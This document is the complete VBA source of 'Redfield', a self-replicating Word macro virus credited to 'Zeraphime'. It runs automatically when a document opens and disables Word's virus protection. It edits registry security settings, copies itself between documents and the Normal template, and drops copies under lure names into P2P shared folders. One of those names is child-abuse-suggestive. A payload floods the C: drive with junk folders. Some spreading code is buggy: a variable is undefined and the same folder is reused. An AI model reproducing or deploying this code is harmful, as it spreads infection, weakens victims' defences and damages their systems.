   Attribute VB_Name = "REDFIELD"
   Sub AutoOpen()
   On Error Resume Next
       Call Infection
   End Sub
   Sub AutoNew()
   On Error Resume Next
       Call Infection
   End Sub
   Sub Infection()
   Dim shell, fso
   On Error Resume Next
   'Redfield
   '(c) by Zeraphime
   z = 0: S = System: NT = NormalTemplate: AD = ActiveDocument: PPS = PrivateProfileString
   With Options
       .ConfirmConversions = z
       .VirusProtection = z
       .SaveNormalPrompt = z
   End With
   S.PPS("", "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application.Version & "\Word\Security", "Level") = 1&
   S.PPS("", "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application.Version & "\Word\Security", "AccessVBOM") = 1&
   WordBasic.DisableAutoMacros z
   Set Norm = NT.VBProject.VBComponents
   Set Doc = AD.VBProject.VBComponents
   If Norm.Item("redfield").Name <> "redfield" Then
   Doc("redfield").Export "C:\redfield.drv"
   Set i = NT.VBProject
   ElseIf Doc.Item("redfield").Name <> "redfield" Then
   Norm("redfield").Export "C:\redfield.drv"
   Set i = AD.VBProject
   End If
   i.VBComponents.Import ("C:\redfield.drv")
   ActiveDocument.Save
   'taken from NWWF by Necronomikom/DCA
   Set shell = CreateObject("wscript.shell")
   Set fso = CreateObject("scripting.filesystemobject")
   Pgdir = shell.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   Files = Array("AIM Password Stealer.exe", "Hot Girl.jpg", "Pussy.jpg", "preteensex.avi", "big boobs.jpg", "nuke afghanistan game.exe", "School Reports.doc", "Sex Tips.doc", "Lord of the rings.doc", "nec is back.doc", "Eminem - I need to be shot.mp3", "BitchSuck.avi")
   kl = (Pgdir & "\kazaa lite\my shared folder") & "\"
   If fso.folderexists(kl) Then
    For x = 0 To 11
     fso.copyfile necfilez, kl & Files(x) & ".doc"
    Next
   End If
   kazaa = (Pgdir & "\kazaa\my shared folder") & "\"
   If fso.folderexists(kazaa) Then
    For x = 0 To 11
     fso.copyfile necfilez, kl & Files(x) & ".doc"
    Next
   End If
   kmd = (Pgdir & "\kmd\my shared folder") & "\"
   If fso.folderexists(kmd) Then
    For x = 0 To 11
     fso.copyfile necfilez, kl & Files(x) & ".doc"
    Next
   End If
   grokster = (Pgdir & "\grokster\my grokster") & "\"
   If fso.folderexists(grokster) Then
    For x = 0 To 11
     fso.copyfile necfilez, kl & Files(x) & ".doc"
    Next
   End If
   bearshare = (Pgdir & "\bearshare\shared") & "\"
   If fso.folderexists(bearshare) Then
    For x = 0 To 11
     fso.copyfile necfilez, kl & Files(x) & ".doc"
    Next
   End If
   edonkey = (Pgdir & "\edonkey2000\incoming") & "\"
   If fso.folderexists(edonkey) Then
    For x = 0 To 11
     fso.copyfile necfilez, kl & Files(x) & ".doc"
    Next
   End If
   morpheus = (Pgdir & "\morpheus\my shared folder") & "\"
   If fso.folderexists(morpheus) Then
    For x = 0 To 11
     fso.copyfile necfilez, kl & Files(x) & ".doc"
    Next
   End If
   limewire = (Pgdir & "\limewire\shared") & "\"
   If fso.folderexists(limewire) Then
    For x = 0 To 11
     fso.copyfile necfilez, kl & Files(x) & ".doc"
    Next
   End If
   Tesla = (Pgdir & "\Tesla\Files") & "\"
   If fso.folderexists(Tesla) Then
    For x = 0 To 11
     fso.copyfile necfilez, kl & Files(x) & ".doc"
    Next
   End If
   XoloX = (Pgdir & "\XoloX\Downloads") & "\"
   If fso.folderexists(XoloX) Then
    For x = 0 To 11
     fso.copyfile necfilez, kl & Files(x) & ".doc"
    Next
   End If
   Shareaza = (Pgdir & "\Shareaza\downloads\") & "\"
   If fso.folderexists(Shareaza) Then
    For x = 0 To 11
     fso.copyfile necfilez, kl & Files(x) & ".doc"
    Next
   End If
   Gnucleus = (Pgdir & "\Gnucleus\downloads") & "\"
   If fso.folderexists(Gnucleus) Then
    For x = 0 To 11
     fso.copyfile necfilez, kl & Files(x) & ".doc"
    Next
   End If
   WinMX = (Pgdir & "\WinMX\my shared folder") & "\"
   If fso.folderexists(WinMX) Then
    For x = 0 To 11
     fso.copyfile necfilez, kl & Files(x) & ".doc"
    Next
   End If
   Ftopia3 = (Pgdir & "\Ftopia3\Files") & "\"
   If fso.folderexists(Ftopia3) Then
    For x = 0 To 11
     fso.copyfile necfilez, kl & Files(x) & ".doc"
    Next
   End If
   Toadnode = (Pgdir & "\Toadnode\share") & "\"
   If fso.folderexists(Toadnode) Then
    For x = 0 To 11
     fso.copyfile necfilez, kl & Files(x) & ".doc"
    Next
   End If
   icq = (Pgdir & "\icq\shared files") & "\"
   If fso.folderexists(icq) Then
    For x = 0 To 11
     fso.copyfile necfilez, kl & Files(x) & ".doc"
    Next
   End If
   Overnet = (Pgdir & "\Overnet\Incoming") & "\"
   If fso.folderexists(Overnet) Then
    For x = 0 To 11
     fso.copyfile necfilez, kl & Files(x) & ".doc"
    Next
   End If
   Rapigator = (Pgdir & "\Rapigator\Share") & "\"
   If fso.folderexists(Rapigator) Then
    For x = 0 To 11
     fso.copyfile necfilez, kl & Files(x) & ".doc"
    Next
   End If
   Apple = (Pgdir & "\AppleJuice\Incoming") & "\"
   If fso.folderexists(Apple) Then
    For x = 0 To 11
     fso.copyfile necfilez, kl & Files(x) & ".doc"
    Next
   End If
   If S.PPS("", "HKLM\Software\Microsoft\Windows NT\CurrentVersion", "RegisteredOwner") <> "zeraphime" Then
   Call msg
   Else
   Call HDkill
   End If
   End Sub
   Sub msg()
   MsgBox "Luke i am your daddy...;)", vbInformation, "REDFIELD Info:"
   End Sub
   Sub HDkill()
   Randomize
   For XXX = 1 To Int(Rnd * 10000) + 100
   AAA = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65)
   MkDir "c:\" & AAA
   Next XXX
   End Sub
   Sub helpabout()
   MsgBox "(c) by Zeraphime", vbInformation, "REDFIELD"
   End Sub
